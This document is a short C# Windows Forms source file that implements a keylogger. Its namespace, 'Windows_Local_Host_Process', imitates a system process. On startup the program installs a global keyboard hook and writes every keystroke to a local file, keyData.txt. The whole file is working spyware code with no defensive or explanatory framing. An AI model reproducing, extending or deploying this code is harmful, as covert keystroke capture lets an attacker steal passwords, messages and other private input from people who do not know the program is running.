using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;
using Keystroke.API;

namespace Windows_Local_Host_Process
{
    public partial class Form1 : Form
    {
        private KeystrokeAPI _keystrokeApi;
        private StreamWriter _sw;

        public Form1()
        {
            InitializeComponent();
            InitKeylogger();
        }
        private void Form1_KeyUp(object sender, KeyEventArgs e)
        {
            //Removed...
        }

        private void InitKeylogger()
        {
            _keystrokeApi = new KeystrokeAPI();
            _sw = new StreamWriter(@"keyData.txt", true);

            //Create a hook that write to file when key is pressed
            _keystrokeApi.CreateKeyboardHook((character) => {
                _sw.Write(character);
                _sw.Flush();
            });
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            _keystrokeApi.Dispose();
            _sw.Close();
		}
    }
}
